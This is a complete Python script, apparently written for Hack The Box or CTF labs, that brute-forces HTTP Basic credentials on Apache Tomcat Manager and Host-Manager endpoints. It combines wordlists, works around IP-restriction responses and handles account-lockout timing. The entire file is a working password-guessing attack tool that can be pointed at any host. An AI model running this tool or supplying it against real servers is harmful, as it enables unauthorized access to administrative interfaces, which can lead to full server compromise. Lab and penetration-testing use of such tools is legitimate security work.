#!/usr/bin/env python3
import requests
import sys
import time
from itertools import product
from requests.auth import HTTPBasicAuth
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI colors
R  = "\033[1;31m"   # bold red
G  = "\033[1;32m"   # bold green
Y  = "\033[1;33m"   # bold yellow
B  = "\033[1;34m"   # bold blue
C  = "\033[1;36m"   # bold cyan
M  = "\033[1;35m"   # bold magenta
W  = "\033[1;37m"   # bold white
DIM = "\033[2m"     # dim
RST = "\033[0m"     # reset

# (path, required role) — /manager/text preferred: no CSRF, clean response
MANAGER_PATHS = [
    ("/manager/text",      "manager-script"),
    ("/manager/html",      "manager-gui"),
    ("/host-manager/text", "admin-script"),
    ("/host-manager/html", "admin-gui"),
]

# Fragments present in Tomcat's IP-restriction 403 body (RemoteAddrValve)
IP_BLOCK_MARKERS = [
    "access denied",
    "you are not allowed to access",
    "by default the manager is only accessible from a browser running on the same machine",
    "remotely",
]


def prompt(msg, default=None):
    suffix = f" {DIM}[{default}]{RST}" if default else ""
    val = input(f"{C}{msg}{RST}{suffix}: ").strip()
    return val if val else default


def load_wordlist(path):
    try:
        with open(path, "r", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{R}[!]{RST} File not found: {path}")
        sys.exit(1)


def load_combos(path):
    pairs = []
    for line in load_wordlist(path):
        if ":" in line:
            user, _, passwd = line.partition(":")
            pairs.append((user, passwd))
        else:
            print(f"{Y}[!]{RST} Skipping malformed line (expected user:pass): {DIM}{line}{RST}")
    return pairs


def clear_line():
    print("\r" + " " * 90 + "\r", end="", flush=True)


def is_ip_blocked_body(body: str) -> bool:
    body_lower = body.lower()
    return any(marker in body_lower for marker in IP_BLOCK_MARKERS)


def check_baseline(url):
    """Unauthenticated probe — reveals IP blocks and whether endpoint exists."""
    try:
        r = requests.get(url, verify=False, timeout=5, allow_redirects=False)
        return r.status_code, r.text
    except requests.exceptions.ConnectionError:
        return None, ""
    except requests.exceptions.Timeout:
        return None, ""


def try_login(session, url, username, password, timeout=5):
    try:
        r = session.get(url, auth=HTTPBasicAuth(username, password),
                        verify=False, timeout=timeout,
                        allow_redirects=False)
        return r.status_code, r.text
    except requests.exceptions.ConnectionError:
        print(f"\n{R}[!]{RST} Connection refused — check host/port.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        return None, ""


def brute(target_url, pairs, baseline_ip_blocked=False, delay=0, stop_on_first=True):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    found = []
    total = len(pairs)

    for i, (user, passwd) in enumerate(pairs, 1):
        print(f"\r{DIM}[*] Trying {i}/{total}: {user}:{passwd:<30}{RST}", end="", flush=True)
        code, body = try_login(session, target_url, user, passwd)

        if code == 200:
            clear_line()
            print(f"{G}[+] SUCCESS{RST}  =>  {W}{user}:{passwd}{RST}  @  {C}{target_url}{RST}")
            found.append((user, passwd, target_url, "200 OK"))
            if stop_on_first:
                break

        elif code == 403:
            if baseline_ip_blocked or is_ip_blocked_body(body):
                pass  # IP-blocked — not a credential signal
            else:
                clear_line()
                print(f"{Y}[~] Valid creds, wrong role (403){RST}  =>  {W}{user}:{passwd}{RST}  @  {C}{target_url}{RST}")
                found.append((user, passwd, target_url, "403 Wrong Role"))
                if stop_on_first:
                    break

        elif code == 401:
            pass  # Wrong credentials — expected, continue silently

        elif code is None:
            clear_line()
            print(f"{R}[!]{RST} Timeout on {user}:{passwd} — skipping")

        else:
            clear_line()
            print(f"{M}[?]{RST} Unexpected HTTP {code} on {user}:{passwd}")

        if delay > 0:
            time.sleep(delay)

    print()
    return found


def banner():
    print(f"""
{R}  ████████╗ ██████╗ ███╗   ███╗ ██████╗ █████╗ ████████╗{RST}
{Y}     ██╔══╝██╔═══██╗████╗ ████║██╔════╝██╔══██╗╚══██╔══╝{RST}
{G}     ██║   ██║   ██║██╔████╔██║██║     ███████║   ██║   {RST}
{C}     ██║   ██║   ██║██║╚██╔╝██║██║     ██╔══██║   ██║   {RST}
{B}     ██║   ╚██████╔╝██║ ╚═╝ ██║╚██████╗██║  ██║   ██║   {RST}
{M}     ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   {RST}
{DIM}              Manager Brute-Forcer  |  HTB/CTF{RST}
""")


def main():
    banner()

    host      = prompt("Target IP or hostname", "10.129.136.9")
    port      = prompt("Target port", "8080")
    path      = prompt("Manager path (leave blank to auto-try all)", "")
    stop_first = prompt("Stop on first hit? (y/n)", "y").lower() == "y"

    print(f"\n{Y}[!]{RST} LockOutRealm: Tomcat locks accounts after {W}5 failed attempts{RST} for {W}300s{RST}")
    delay_str = prompt("Delay between attempts in seconds (0 = no delay, 1+ = safer)", "0")
    try:
        delay = float(delay_str)
    except ValueError:
        delay = 0

    print(f"\n{W}Input mode:{RST}")
    print(f"  {C}1){RST} Separate username and password files")
    print(f"  {C}2){RST} Combo file (user:pass per line)")
    mode = prompt("Choose [1/2]", "1")

    if mode == "2":
        combo_file = prompt("Path to combo file")
        pairs = load_combos(combo_file)
    else:
        user_file = prompt("Path to username file")
        pass_file = prompt("Path to password file")
        users     = load_wordlist(user_file)
        passwords = load_wordlist(pass_file)
        pairs     = list(product(users, passwords))

    print(f"\n{B}[*]{RST} Loaded {W}{len(pairs)}{RST} credential pair(s)")
    if delay == 0:
        print(f"{Y}[!]{RST} No delay set — LockOutRealm may trigger after 5 attempts per username")

    scheme = "http"
    base   = f"{scheme}://{host}:{port}"

    paths_to_try = [(path, "unknown")] if path else MANAGER_PATHS
    all_found    = []

    for mgr_path, required_role in paths_to_try:
        url = base + mgr_path
        print(f"\n{B}[*]{RST} Probing: {C}{url}{RST}  {DIM}(requires role: {required_role}){RST}")

        baseline_code, baseline_body = check_baseline(url)

        if baseline_code is None:
            print(f"{R}[!]{RST} Cannot reach {url} — skipping")
            continue

        if baseline_code == 404:
            print(f"{R}[!]{RST} 404 — not deployed, skipping")
            continue

        if baseline_code == 403:
            print(f"{Y}[!]{RST} IP-restricted (RemoteAddrValve) — ignoring 403 hits, only {G}200{RST} counts")
            baseline_ip_blocked = True
        elif baseline_code == 401:
            print(f"{G}[*]{RST} Got {W}401{RST} (auth required) — endpoint open, starting bruteforce")
            baseline_ip_blocked = False
        else:
            print(f"{B}[*]{RST} Baseline HTTP {baseline_code} — proceeding")
            baseline_ip_blocked = False

        found = brute(url, pairs,
                      baseline_ip_blocked=baseline_ip_blocked,
                      delay=delay,
                      stop_on_first=stop_first)
        all_found.extend(found)

        if found and stop_first:
            break
        elif not found:
            print(f"{R}[-]{RST} No valid credentials found on {mgr_path}")

    print(f"\n{W}{'=' * 55}{RST}")
    if all_found:
        print(f"{G}[+] Valid credentials:{RST}")
        for u, p, hit_url, status in all_found:
            color = G if "200" in status else Y
            print(f"    {color}[{status}]{RST}  {W}{u}:{p}{RST}  =>  {C}{hit_url}{RST}")
    else:
        print(f"{R}[-] No credentials found.{RST}")
    print(f"{W}{'=' * 55}{RST}")


if __name__ == "__main__":
    main()
